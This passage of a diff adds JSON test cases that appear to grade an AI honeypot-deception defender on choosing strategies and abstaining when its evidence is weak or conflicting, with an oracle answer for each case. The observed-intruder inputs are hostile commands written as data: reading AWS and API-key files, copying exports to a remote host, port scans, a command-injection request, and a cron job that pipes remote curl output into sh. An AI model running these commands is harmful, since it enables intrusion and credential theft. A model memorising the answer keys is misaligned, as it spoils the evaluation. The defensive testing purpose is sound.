+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for gw-08 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.26
+            },
+            {
+              "doc_id": "D4",
+              "title": "Backup Verification",
+              "content_excerpt": "Nightly backup verification for gw-08 completed with no failed volumes.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.29
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "fake_success_and_return_visits"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-019",
+      "name": "sufficient_data_access",
+      "archetype": "sufficient",
+      "scenario": "data_access",
+      "state": {
+        "session": {
+          "current_input": "scp -r /srv/exports auditor@10.20.172.77:/tmp/"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.8,
+          "observed_techniques": [
+            "T1005"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0009"
+          ],
+          "observed_ttps": [
+            "T1005"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Fake Success Staging",
+              "content_excerpt": "Collection activity against jump-04 is best answered with staged fake success so the actor returns to the observable collection path instead of seeking alternatives.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "Return Visit Cycle",
+              "content_excerpt": "The observed archive staging matches the cycle that historically brings actors back to the instrumented share; sustaining the illusion keeps coverage.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.76
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for jump-04 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.26
+            },
+            {
+              "doc_id": "D4",
+              "title": "Network Inventory Sync",
+              "content_excerpt": "The asset inventory service refreshed host records for 192.168.162 overnight.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.18
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "fake_success_and_return_visits"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-020",
+      "name": "sufficient_data_access",
+      "archetype": "sufficient",
+      "scenario": "data_access",
+      "state": {
+        "session": {
+          "current_input": "scp -r /srv/exports auditor@10.20.222.77:/tmp/"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.77,
+          "observed_techniques": [
+            "T1560.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0009"
+          ],
+          "observed_ttps": [
+            "T1560.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Fake Success Staging",
+              "content_excerpt": "Collection activity against jump-04 is best answered with staged fake success so the actor returns to the observable collection path instead of seeking alternatives.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.87
+            },
+            {
+              "doc_id": "D2",
+              "title": "Return Visit Cycle",
+              "content_excerpt": "The observed archive staging matches the cycle that historically brings actors back to the instrumented share; sustaining the illusion keeps coverage.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.8
+            },
+            {
+              "doc_id": "D3",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for jump-04 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            },
+            {
+              "doc_id": "D4",
+              "title": "Certificate Renewal Log",
+              "content_excerpt": "TLS certificate renewal for jump-04 succeeded during the low-traffic window.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.21
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "fake_success_and_return_visits"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-021",
+      "name": "sufficient_single_data_access",
+      "archetype": "sufficient_single",
+      "scenario": "data_access",
+      "state": {
+        "session": {
+          "current_input": "mysqldump -u root -p'fromfile' appdb > /tmp/appdb.sql"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.6,
+          "observed_techniques": [
+            "T1560.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0009"
+          ],
+          "observed_ttps": [
+            "T1560.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Fake Success Staging",
+              "content_excerpt": "Collection activity against jump-04 is best answered with staged fake success so the actor returns to the observable collection path instead of seeking alternatives.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for jump-04 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for jump-04 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.25
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "fake_success_and_return_visits"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-022",
+      "name": "sufficient_benign_admin",
+      "archetype": "sufficient",
+      "scenario": "benign_admin",
+      "state": {
+        "session": {
+          "current_input": "apt-get update && apt-get upgrade -y"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.58,
+          "observed_techniques": []
+        },
+        "don_analysis": {
+          "severity": "low",
+          "tactics": [],
+          "observed_ttps": [],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Routine Administration Pattern",
+              "content_excerpt": "The operations seen on app-07 match routine system administration and call for low-intensity administration that leaves the environment unchanged.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "Maintenance Window Context",
+              "content_excerpt": "Package and log maintenance on app-07 aligns with the standing maintenance runbook; measured low-intensity handling is appropriate.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.81
+            },
+            {
+              "doc_id": "D3",
+              "title": "Certificate Renewal Log",
+              "content_excerpt": "TLS certificate renewal for app-07 succeeded during the low-traffic window.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.2
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "low_intensity_administration",
+          "baseline"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-023",
+      "name": "sufficient_benign_admin",
+      "archetype": "sufficient",
+      "scenario": "benign_admin",
+      "state": {
+        "session": {
+          "current_input": "systemctl status sshd"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.8,
+          "observed_techniques": []
+        },
+        "don_analysis": {
+          "severity": "low",
+          "tactics": [],
+          "observed_ttps": [],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Routine Administration Pattern",
+              "content_excerpt": "The operations seen on gw-08 match routine system administration and call for low-intensity administration that leaves the environment unchanged.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.9
+            },
+            {
+              "doc_id": "D2",
+              "title": "Maintenance Window Context",
+              "content_excerpt": "Package and log maintenance on gw-08 aligns with the standing maintenance runbook; measured low-intensity handling is appropriate.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.79
+            },
+            {
+              "doc_id": "D3",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for gw-08 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.15
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "low_intensity_administration",
+          "baseline"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-024",
+      "name": "sufficient_benign_admin",
+      "archetype": "sufficient",
+      "scenario": "benign_admin",
+      "state": {
+        "session": {
+          "current_input": "journalctl -u nginx --since today"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.91,
+          "observed_techniques": []
+        },
+        "don_analysis": {
+          "severity": "low",
+          "tactics": [],
+          "observed_ttps": [],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Routine Administration Pattern",
+              "content_excerpt": "The operations seen on app-07 match routine system administration and call for low-intensity administration that leaves the environment unchanged.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.91
+            },
+            {
+              "doc_id": "D2",
+              "title": "Maintenance Window Context",
+              "content_excerpt": "Package and log maintenance on app-07 aligns with the standing maintenance runbook; measured low-intensity handling is appropriate.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.81
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for app-07 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.23
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "low_intensity_administration",
+          "baseline"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-025",
+      "name": "sufficient_honeytoken",
+      "archetype": "sufficient",
+      "scenario": "honeytoken",
+      "state": {
+        "session": {
+          "current_input": "ls -la /opt/secrets/ && cat /opt/secrets/api_keys.json"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.79,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Planted Credential Interaction",
+              "content_excerpt": "The intruder is reading planted credential files on web-01; continued steering to honeytoken documents maximizes observable credential use.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.9
+            },
+            {
+              "doc_id": "D2",
+              "title": "Honeytoken Engagement Signal",
+              "content_excerpt": "Access to the decoy secret store on web-01 is the exact honeytoken engagement signal this playbook monitors.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.83
+            },
+            {
+              "doc_id": "D3",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for web-01 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "steer_to_honeytoken_credentials"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-026",
+      "name": "sufficient_honeytoken",
+      "archetype": "sufficient",
+      "scenario": "honeytoken",
+      "state": {
+        "session": {
+          "current_input": "cat /home/deploy/.aws/credentials"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.63,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Planted Credential Interaction",
+              "content_excerpt": "The intruder is reading planted credential files on web-01; continued steering to honeytoken documents maximizes observable credential use.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.91
+            },
+            {
+              "doc_id": "D2",
+              "title": "Honeytoken Engagement Signal",
+              "content_excerpt": "Access to the decoy secret store on web-01 is the exact honeytoken engagement signal this playbook monitors.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.85
+            },
+            {
+              "doc_id": "D3",
+              "title": "Certificate Renewal Log",
+              "content_excerpt": "TLS certificate renewal for web-01 succeeded during the low-traffic window.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.21
+            },
+            {
+              "doc_id": "D4",
+              "title": "Proxy Cache Statistics",
+              "content_excerpt": "Edge proxy cache hit ratios for 10.20.236 remained within the expected band today.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.16
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "steer_to_honeytoken_credentials"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-027",
+      "name": "sufficient_topology",
+      "archetype": "sufficient",
+      "scenario": "topology",
+      "state": {
+        "session": {
+          "current_input": "ldapsearch -x -H ldap://10.20.73.55 -b dc=corp,dc=local"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.9,
+          "observed_techniques": [
+            "T1135"
+          ]
+        },
+        "don_analysis": {
+          "severity": "medium",
+          "tactics": [
+            "TA0007"
+          ],
+          "observed_ttps": [
+            "T1135"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Decoy Topology Exposure",
+              "content_excerpt": "Share and directory enumeration from 10.20.154.86 is best answered by exposing the decoy internal topology, which absorbs further discovery safely.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.89
+            },
+            {
+              "doc_id": "D2",
+              "title": "Absorbing Discovery",
+              "content_excerpt": "The observed topology probing matches cases where the decoy network map redirected enumeration away from production paths.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.81
+            },
+            {
+              "doc_id": "D3",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.44
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "expose_decoy_internal_topology"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-028",
+      "name": "sufficient_fiction",
+      "archetype": "sufficient",
+      "scenario": "fiction",
+      "state": {
+        "session": {
+          "current_input": "cat README.md"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.88,
+          "observed_techniques": [
+            "T1083"
+          ]
+        },
+        "don_analysis": {
+          "severity": "medium",
+          "tactics": [
+            "TA0007"
+          ],
+          "observed_ttps": [
+            "T1083"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Fiction Continuity",
+              "content_excerpt": "The actor is following the planted story on web-01; continuing the instrumented fiction preserves engagement and observation.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D2",
+              "title": "In-Story Containment",
+              "content_excerpt": "File discovery inside the fictional project tree on web-01 matches the containment scenario this playbook maintains.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.8
+            },
+            {
+              "doc_id": "D3",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for web-01 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.24
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "SUFFICIENT",
+        "allowed_strategies": [
+          "contain_in_fiction_and_instrument"
+        ],
+        "required_abstain": false,
+        "allowed_evidence_refs": [
+          "D1",
+          "D2"
+        ]
+      }
+    },
+    {
+      "case_id": "EV-029",
+      "name": "required_missing_recon",
+      "archetype": "required_missing",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "masscan -p1-65535 --rate=1500 172.16.60.0/24"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.66,
+          "observed_techniques": [
+            "T1046",
+            "T1595"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046",
+            "T1595"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": []
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-030",
+      "name": "required_missing_persistence",
+      "archetype": "required_missing",
+      "scenario": "persistence",
+      "state": {
+        "session": {
+          "current_input": "echo '* * * * * curl -s http://10.20.180.5/t.sh | sh' | crontab -"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.73,
+          "observed_techniques": [
+            "T1543.002"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0003"
+          ],
+          "observed_ttps": [
+            "T1543.002"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": []
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-031",
+      "name": "required_weak_credential",
+      "archetype": "required_weak",
+      "scenario": "credential",
+      "state": {
+        "session": {
+          "current_input": "sshpass -p 'Summer2026!' ssh root@10.20.50.30"
+        },
+        "behavior": {
+          "skill_level": "advanced",
+          "confidence": 0.96,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Security Awareness Circular",
+              "content_excerpt": "Company-wide reminders about phishing hygiene; not tied to any incident or host.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.92
+            },
+            {
+              "doc_id": "D2",
+              "title": "Threat Landscape Bulletin",
+              "content_excerpt": "Quarterly summary of common attacker techniques; no host-specific or session-specific evidence is provided.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.87
+            },
+            {
+              "doc_id": "D3",
+              "title": "Generic Hardening Guide",
+              "content_excerpt": "A general hardening checklist for Unix hosts; it references no specific host, actor, or observed command.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D4",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for web-01 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.15
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-032",
+      "name": "required_weak_data_access",
+      "archetype": "required_weak",
+      "scenario": "data_access",
+      "state": {
+        "session": {
+          "current_input": "find / -name '*.kdbx' 2>/dev/null"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.65,
+          "observed_techniques": [
+            "T1005"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0009"
+          ],
+          "observed_ttps": [
+            "T1005"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Threat Landscape Bulletin",
+              "content_excerpt": "Quarterly summary of common attacker techniques; no host-specific or session-specific evidence is provided.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.87
+            },
+            {
+              "doc_id": "D2",
+              "title": "Generic Hardening Guide",
+              "content_excerpt": "A general hardening checklist for Unix hosts; it references no specific host, actor, or observed command.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.86
+            },
+            {
+              "doc_id": "D3",
+              "title": "Security Awareness Circular",
+              "content_excerpt": "Company-wide reminders about phishing hygiene; not tied to any incident or host.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.88
+            },
+            {
+              "doc_id": "D4",
+              "title": "Change Management Windows",
+              "content_excerpt": "Scheduled maintenance windows for app-07 cover weekly patching of the base image.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.26
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-033",
+      "name": "required_partial_recon",
+      "archetype": "required_partial",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "nmap -sS -Pn -p 1-1024 10.20.242.0/24"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.56,
+          "observed_techniques": [
+            "T1046"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Partial Scan Coverage",
+              "content_excerpt": "The scan touches only two services on file-03; the excerpt does not cover the remaining enumeration steps and cannot establish intent.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.68
+            },
+            {
+              "doc_id": "D2",
+              "title": "Baseline Hardening Policy",
+              "content_excerpt": "The benchmark hardening profile applies industry-standard controls to all managed hosts.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.42
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-034",
+      "name": "required_partial_topology",
+      "archetype": "required_partial",
+      "scenario": "topology",
+      "state": {
+        "session": {
+          "current_input": "smbclient -L //10.20.203.50 -N"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.67,
+          "observed_techniques": [
+            "T1135"
+          ]
+        },
+        "don_analysis": {
+          "severity": "medium",
+          "tactics": [
+            "TA0007"
+          ],
+          "observed_ttps": [
+            "T1135"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Partial Topology View",
+              "content_excerpt": "Only one share list request appears for gw-08; the excerpt cannot establish systematic topology enumeration.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.57
+            },
+            {
+              "doc_id": "D2",
+              "title": "Network Inventory Sync",
+              "content_excerpt": "The asset inventory service refreshed host records for 10.55.141 overnight.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.2
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "INSUFFICIENT",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-035",
+      "name": "required_conflict_recon",
+      "archetype": "required_conflict",
+      "scenario": "recon",
+      "state": {
+        "session": {
+          "current_input": "nmap -sS -Pn -p 1-1024 10.20.119.0/24"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.63,
+          "observed_techniques": [
+            "T1046"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0043"
+          ],
+          "observed_ttps": [
+            "T1046"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 192.168.194 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.94
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 10.20.9.142 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.85
+            },
+            {
+              "doc_id": "D3",
+              "title": "Scheduled Inventory Agent",
+              "content_excerpt": "The same scan pattern is emitted by the sanctioned inventory agent at 192.168.194 on a weekly schedule, which rules out hostile reconnaissance.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.76
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "CONFLICTING",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-036",
+      "name": "required_conflict_credential",
+      "archetype": "required_conflict",
+      "scenario": "credential",
+      "state": {
+        "session": {
+          "current_input": "sshpass -p 'Summer2026!' ssh root@10.20.173.30"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.94,
+          "observed_techniques": [
+            "T1552.001"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0006"
+          ],
+          "observed_ttps": [
+            "T1552.001"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Honeytoken Credential Path",
+              "content_excerpt": "Credential-focused activity from 172.16.127.63 is best steered toward the planted honeytoken credentials, which keep the intruder observable without exposing real secrets.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.9
+            },
+            {
+              "doc_id": "D2",
+              "title": "Decoy Secret Placement",
+              "content_excerpt": "The observed credential probing matches prior cases where directing the actor to decoy secrets converted the intrusion into a monitored channel.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.81
+            },
+            {
+              "doc_id": "D3",
+              "title": "Authorized Key Rotation",
+              "content_excerpt": "The same credential operations are performed by the operations team during a scheduled key rotation window on web-01.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.76
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "CONFLICTING",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-037",
+      "name": "required_contradiction_persistence",
+      "archetype": "required_contradiction",
+      "scenario": "persistence",
+      "state": {
+        "session": {
+          "current_input": "cat /etc/systemd/system/update-check.service"
+        },
+        "behavior": {
+          "skill_level": "expert",
+          "confidence": 0.71,
+          "observed_techniques": [
+            "T1053.003"
+          ]
+        },
+        "don_analysis": {
+          "severity": "high",
+          "tactics": [
+            "TA0003"
+          ],
+          "observed_ttps": [
+            "T1053.003"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 10.77.138 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.89
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 192.168.113.27 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.84
+            },
+            {
+              "doc_id": "D3",
+              "title": "Capacity Planning Note",
+              "content_excerpt": "Memory headroom guidance for db-02 recommends a future resize during the next cycle.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.17
+            }
+          ]
+        }
+      },
+      "oracle": {
+        "evidence_state": "CONFLICTING",
+        "allowed_strategies": [
+          "baseline"
+        ],
+        "required_abstain": true,
+        "allowed_evidence_refs": []
+      }
+    },
+    {
+      "case_id": "EV-038",
+      "name": "required_contradiction_exploitation",
+      "archetype": "required_contradiction",
+      "scenario": "exploitation",
+      "state": {
+        "session": {
+          "current_input": "curl -s -X POST http://10.20.5.40/api/exec -d 'cmd=id'"
+        },
+        "behavior": {
+          "skill_level": "intermediate",
+          "confidence": 0.63,
+          "observed_techniques": [
+            "T1059.004"
+          ]
+        },
+        "don_analysis": {
+          "severity": "critical",
+          "tactics": [
+            "TA0001"
+          ],
+          "observed_ttps": [
+            "T1059.004"
+          ],
+          "iocs": []
+        },
+        "retrieval": {
+          "documents": [
+            {
+              "doc_id": "D1",
+              "title": "Recon Surface Expansion",
+              "content_excerpt": "Sequential host and service enumeration across 10.77.97 is consistent with deliberate reconnaissance and is best answered by expanding the decoy recon surface.",
+              "source": "synthetic-calibration-tuning",
+              "retrieval_score": 0.93
+            },
+            {
+              "doc_id": "D2",
+              "title": "Staged Scanning Behavior",
+              "content_excerpt": "The observed scan cadence from 172.16.77.72 matches staged discovery; sustaining a broad decoy surface keeps the intruder engaged and observable.",
+              "source": "synthetic-calibration-tuning",
